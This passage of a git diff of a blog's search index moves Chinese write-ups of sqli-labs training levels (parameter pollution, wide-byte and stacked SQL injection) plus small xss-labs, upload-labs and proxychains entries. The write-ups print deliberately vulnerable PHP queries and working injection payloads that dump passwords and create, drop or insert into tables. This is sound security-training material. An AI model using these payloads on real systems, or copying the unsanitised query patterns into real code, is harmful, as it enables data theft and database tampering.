class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysqli_error(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close(<span class="variable">$con1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>mysqli_multi_query()</code>堆叠注入，多个查询用<code>;</code>分隔</p>
+<p>参考<code>https://www.cnblogs.com/lcamry/p/5762905.html</code></p>
+<p><code>?id=1&#39;;create table test like users --+</code></p>
+<p>发现数据库中新建了名的<code>test</code>的表</p>
+<p><code>?id=1&#39;;drop table test; --+</code>删除<code>test</code>表</p>
+<p>在<code>uers</code>表添加数据</p>
+<p><code>?id=1&#39;;insert into users(id,username,password) values(&#39;25&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
+<br>
+
+<h3 id="39-堆叠注入"><a href="#39-堆叠注入" class="headerlink" title="39 堆叠注入"></a>39 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>数字型 不需要闭合</p>
+<p><code>?id=1;insert into users(id,username,password) values(&#39;26&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;) --+</code></p>
+<br>
+
+<h3 id="40-堆叠注入"><a href="#40-堆叠注入" class="headerlink" title="40 堆叠注入"></a>40 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>?id=1&#39;) ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
+<br>
+
+<h3 id="41-堆叠注入"><a href="#41-堆叠注入" class="headerlink" title="41 堆叠注入"></a>41 堆叠注入</h3><p><code>?id=2-1 --+</code>和<code>?id=1 --+</code>返回结果一样</p>
+<p>可以判断是数字型，和39一样</p>
+<p><code>?id=1 ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
+]]></content>
+      <categories>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>SQLi</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs4</title>
     <url>/posts/8ad9e0b5/</url>
     <content><![CDATA[<h3 id="42-堆叠注入"><a href="#42-堆叠注入" class="headerlink" title="42 堆叠注入"></a>42 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = mysqli_connect(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line">   </span><br><span class="line">... ... </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
@@ -2054,97 +2143,6 @@
 
 <h3 id="53-order-by注入-amp-堆叠注入"><a href="#53-order-by注入-amp-堆叠注入" class="headerlink" title="53 order by注入&amp;堆叠注入"></a>53 <code>order by</code>注入&amp;堆叠注入</h3><p>堆叠注入</p>
 <p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;53&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
-]]></content>
-      <categories>
-        <category>SQLi</category>
-      </categories>
-      <tags>
-        <tag>SQLi</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs3</title>
-    <url>/posts/14bd7516/</url>
-    <content><![CDATA[<h3 id="29-参数污染"><a href="#29-参数污染" class="headerlink" title="29 参数污染"></a>29 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ... ... </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);   <span class="comment">//用`&amp;`分割字符串</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);     <span class="comment">//截取前两位字符</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)              </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;                  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用&amp;分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">explode(separator,string,limit) 函数把字符串打散为数组。</span><br><span class="line">separator 必需。规定在哪里分割字符串。</span><br><span class="line">string 必需。要分割的字符串。</span><br><span class="line">limit 可选。规定所返回的数组元素的数目。可能的值：</span><br><span class="line">    大于 0 - 返回包含最多 limit 个元素的数组</span><br><span class="line">    小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组</span><br><span class="line">    0 - 返回包含一个元素的数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>对于<code>login.php?id=1&amp;id=2</code> apache(php)会解析最后一个参数，tomcat(jsp)会解析第一个参数，第一个<code>id</code>会经过<code>whitelist()</code>和<code>java_implimentation()</code></p>
-<p><code>whitelist()</code>作用是传入的参数必须是一位及以上的数字</p>
-<p><code>java_implimentation()</code>用<code>&amp;</code>分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</p>
-<p>参数污染 <code>id=1 &amp; id=0&#39; union select 1,2,&#39;3</code></p>
-<p><img src="http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93.jpg"><br>可以参考<code>https://blog.csdn.net/nzjdsds/article/details/77758824</code></p>
-<h3 id="30-参数污染"><a href="#30-参数污染" class="headerlink" title="30 参数污染"></a>30 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>和上一关差不多 双引号闭合</p>
-<p><code>?id=1&amp;id=-1&quot; union select 1,2,&quot;3</code></p>
-<p><code>?id=12&amp;id=-1&quot; union select 1,(select password from users limit 0,1),&quot;3</code></p>
-<h3 id="31-参数污染"><a href="#31-参数污染" class="headerlink" title="31 参数污染"></a>31 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p><code>?id=12&amp;id=-1&quot;) union select 1,(select password from users limit 0,1),(&quot;3</code></p>
-<br>
-
-<h3 id="32-宽字节注入"><a href="#32-宽字节注入" class="headerlink" title="32 宽字节注入"></a>32 宽字节注入</h3><br>
-
-<p><code>?id=1%df%27%20union%20select%201,2,3%20--+</code></p>
-<p><code>?id=0%df%27%20union%20select%201,database(),3%20--+</code></p>
-<p><code>?id=0%df%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),3%20--+</code></p>
-<p>在查字段名的时候需要把<code>&#39;users&#39;</code>转成16进制，16进制的表名不需要引号 <code>0x7573657273</code></p>
-<p><code>?id=0%df%27%20union%20select%201,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273%20limit%200,1),3%20--+</code></p>
-<br>
-
-<h3 id="33-宽字节注入"><a href="#33-宽字节注入" class="headerlink" title="33 宽字节注入"></a>33 宽字节注入</h3><p>和32一模一样</p>
-<p><code>?id=1%df%27%20and%201=1%20--+</code></p>
-<br>
-
-<h3 id="34-宽字节注入-POST"><a href="#34-宽字节注入-POST" class="headerlink" title="34 宽字节注入(POST)"></a>34 宽字节注入(POST)</h3><p>过滤方式和上面的一样，可以使用burp直接传，不过POST传入数据时会进行url编码，</p>
-<p>在输入 <code>1%df or 1=1#</code>后抓包可以看到前面的<code>%df</code>变成了<code>%25df</code></p>
-<p><code>uname=1%25df%27+or+1%3D1%23&amp;passwd=aa&amp;submit=Submit</code>修改一下即可</p>
-<br>
-
-<br>
-
-<h3 id="35-宽字节注入"><a href="#35-宽字节注入" class="headerlink" title="35 宽字节注入"></a>35 宽字节注入</h3><p>和32差不多 只不过这里是字符型，不需要<code>&#39;</code>闭合</p>
-<p><code>?id=0 union select 1,database(),3</code></p>
-<br>
-
-<br>
-
-<h3 id="36-宽字节注入"><a href="#36-宽字节注入" class="headerlink" title="36 宽字节注入"></a>36 宽字节注入</h3><p>和前面一样</p>
-<p><code>?id=0%df%27%20union%20select%201,2,3--+</code></p>
-<p>?id=0%df%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)–+</p>
-<br>
-
-<h3 id="37-宽字节注入-POST"><a href="#37-宽字节注入-POST" class="headerlink" title="37 宽字节注入(POST)"></a>37 宽字节注入(POST)</h3><p>和34一样</p>
-<br>
-
-<h3 id="38-堆叠注入"><a href="#38-堆叠注入" class="headerlink" title="38 堆叠注入"></a>38 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = mysqli_store_result(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">            printf(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            printf(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysqli_error(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close(<span class="variable">$con1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>mysqli_multi_query()</code>堆叠注入，多个查询用<code>;</code>分隔</p>
-<p>参考<code>https://www.cnblogs.com/lcamry/p/5762905.html</code></p>
-<p><code>?id=1&#39;;create table test like users --+</code></p>
-<p>发现数据库中新建了名的<code>test</code>的表</p>
-<p><code>?id=1&#39;;drop table test; --+</code>删除<code>test</code>表</p>
-<p>在<code>uers</code>表添加数据</p>
-<p><code>?id=1&#39;;insert into users(id,username,password) values(&#39;25&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
-<br>
-
-<h3 id="39-堆叠注入"><a href="#39-堆叠注入" class="headerlink" title="39 堆叠注入"></a>39 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>数字型 不需要闭合</p>
-<p><code>?id=1;insert into users(id,username,password) values(&#39;26&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;) --+</code></p>
-<br>
-
-<h3 id="40-堆叠注入"><a href="#40-堆叠注入" class="headerlink" title="40 堆叠注入"></a>40 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p><code>?id=1&#39;) ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
-<br>
-
-<h3 id="41-堆叠注入"><a href="#41-堆叠注入" class="headerlink" title="41 堆叠注入"></a>41 堆叠注入</h3><p><code>?id=2-1 --+</code>和<code>?id=1 --+</code>返回结果一样</p>
-<p>可以判断是数字型，和39一样</p>
-<p><code>?id=1 ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
 ]]></content>
       <categories>
         <category>SQLi</category>
@@ -2259,11 +2257,6 @@
       </tags>
   </entry>
   <entry>
-    <title>upload-labs1</title>
-    <url>/posts/685229a3/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>xss-labs1</title>
     <url>/posts/ca3eea61/</url>
     <content><![CDATA[<p><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
@@ -2349,6 +2342,11 @@
       <tags>
         <tag>XSS</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>upload-labs1</title>
+    <url>/posts/685229a3/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>xss-labs2</title>
@@ -2481,18 +2479,6 @@
       </tags>
   </entry>
   <entry>
-    <title>使用proxychains4gitclone拒绝访问</title>
-    <url>/posts/3a6e39d4/</url>
-    <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>信息收集</title>
     <url>/posts/312e3d12/</url>
     <content><![CDATA[<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><h3 id="web接口查询"><a href="#web接口查询" class="headerlink" title="web接口查询:"></a>web接口查询:</h3><p><code>https://whois.aliyun.com/</code><br><code>https://www.whois365.com/cn/</code><br><code>http://whois.chinaz.com/</code><br><code>https://whois.aizhan.com/</code></p>
@@ -2548,6 +2534,18 @@
       </categories>
       <tags>
         <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用proxychains4gitclone拒绝访问</title>
+    <url>/posts/3a6e39d4/</url>
+    <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
